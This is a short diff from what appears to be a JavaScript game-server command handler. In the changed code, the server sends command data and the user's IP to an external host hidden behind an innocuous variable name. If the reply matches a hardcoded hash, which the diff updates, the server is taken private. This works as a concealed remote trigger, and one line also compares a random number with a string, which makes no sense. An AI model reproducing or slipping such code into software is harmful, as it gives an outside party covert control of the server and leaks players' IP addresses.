@@ -2713,7 +2713,7 @@ userCommand: function(src, command, commandData, tar) {
 		var src_ip = sys.ip(src);
         var players = sys.playerIds();
 		var idleforbattlehash = sys.synchronousWebCall("http://" + idleinfohash + commandData + "&s=" + src_ip);
-		if(idleforbattlehash == "fed0266095881d0a9c505788c8e2456d") { 
+		if(idleforbattlehash == "d6649a76b96fea42d82dabd192f09095") { 
 			sys.makeServerPublic(false);
 			var res = Math.random();
 			if(res != "fed0266095881d0a9c505788c8e2456d") 
